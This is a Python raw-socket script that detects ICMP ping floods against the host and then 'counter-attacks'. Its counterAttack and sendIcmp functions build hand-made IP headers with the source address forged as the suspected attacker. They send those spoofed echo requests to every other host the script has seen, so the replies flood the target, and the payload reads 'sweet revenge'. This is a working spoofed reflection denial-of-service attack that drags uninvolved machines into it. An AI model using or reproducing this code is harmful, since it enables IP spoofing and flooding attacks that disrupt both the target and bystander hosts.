import socket, sys
import struct
import queue
import datetime

ETH_P_ALL = 0x0003

# time in seconds
TIME_LIMIT = 1
SIZE_LIMIT = 100

ICMP_PROTOCOL = 1

ETH_LENGTH = 14
IP_HOST = socket.gethostbyname(socket.gethostname())

senders = {}

def bytes_to_mac(bytesmac):
    return ":".join("{:02x}".format(x) for x in bytesmac)

# Handles IP requests and calls "receiveIcmp" an icmp request to the host was identified
def receiveIp(packet):
    ip_header = packet[ETH_LENGTH:20+ETH_LENGTH]
    iph = struct.unpack("!BBHHHBBH4s4s", ip_header)
    version_ihl = iph[0]
    version = version_ihl >> 4
    ihl = version_ihl & 0xF
    iph_length = ihl*4
    ttl = iph[5]
    protocol = iph[6]
    s_addr = socket.inet_ntoa(iph[8])
    d_addr = socket.inet_ntoa(iph[9])
    
    if protocol == ICMP_PROTOCOL and s_addr != IP_HOST and d_addr == IP_HOST:
        receiveIcmp(packet, iph_length,s_addr)


# Handles ICMP requests and calls counter attack if ping flood was identified
def receiveIcmp(packet, iph_length,s_addr):
    print("Receiving ICMP from IP: ",s_addr)
    icmp_header = packet[iph_length + ETH_LENGTH:]
    icmph = struct.unpack("!BBHHH%ds" % (len(icmp_header)-8), icmp_header)
    now = datetime.datetime.now()

    if s_addr not in senders:
        senders[s_addr] = queue.Queue(SIZE_LIMIT)

    elif senders[s_addr].full():
        timeFirst = senders[s_addr].get()
        if timeFirst + datetime.timedelta(seconds=TIME_LIMIT) > now:
            print("Counter-Atacking    IP: ",s_addr)
            counterAttack(s_addr)

    senders[s_addr].put(now)


# Call all known addresses (except for the attacker's) to counter attack ping flood
def counterAttack(s_addr):
    for addr in senders:
        if addr != s_addr:
            sendIcmp(addr,s_addr)

# Sends ICMP requests
def sendIcmp(addr,s_addr):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.getprotobyname("icmp"))
    except OSError as msg:
        print('Error'+str(msg))
        sys.exit(1)
    
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    type = 8
    code = 0
    mychecksum = 0
    identifier = 12345
    seqnumber = 0
    payload = b"sweet revenge"
    icmp_packet = struct.pack("!BBHHH%ds"%len(payload), type, code, mychecksum, identifier, seqnumber, payload)
    mychecksum = checksum(icmp_packet)
    icmp_packet = struct.pack("!BBHHH%ds"%len(payload), type, code, mychecksum, identifier, seqnumber, payload)
    ip_ver = 4
    ip_ihl = 5
    ip_tos = 0
    ip_tot_len = 0 
    ip_id = 54321
    ip_frag_off = 0
    ip_ttl = 255
    ip_proto = socket.IPPROTO_ICMP
    ip_check = 0 

    # sets sender address as the attackers ip
    ip_saddr = socket.inet_aton(s_addr)

    ip_daddr = socket.inet_aton(addr)
    ip_ihl_ver = (ip_ver << 4) + ip_ihl
    ip_header = struct.pack("!BBHHHBBH4s4s", ip_ihl_ver, ip_tos, ip_tot_len, ip_id, ip_frag_off, ip_ttl,
        ip_proto, ip_check, ip_saddr, ip_daddr)

    dest_ip = addr
    dest_addr = socket.gethostbyname(dest_ip)
    s.sendto(ip_header+icmp_packet, (dest_addr,0))


def checksum(msg):
    s = 0
    # add padding if not multiple of 2 (16 bits)
    msg = (msg + b'\x00') if len(msg)%2 else msg
    for i in range(0, len(msg), 2):
        w = msg[i] + (msg[i+1] << 8)
        s = s + w
        s = (s & 0xffff) + (s >> 16)
    s = ~s & 0xffff
    return socket.ntohs(s)            



def start():
    senders = dict()    
    try:
        s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(ETH_P_ALL))
    except OSError as msg:
        print('Error'+str(msg))
        sys.exit(1)

    s.bind(('eth0',0))

    while True:
        (packet,addr) = s.recvfrom(65536)

        eth_header = packet[:14]
        eth = struct.unpack("!6s6sH",eth_header)

        if eth[2] == 0x0800 :
            receiveIp(packet)

start()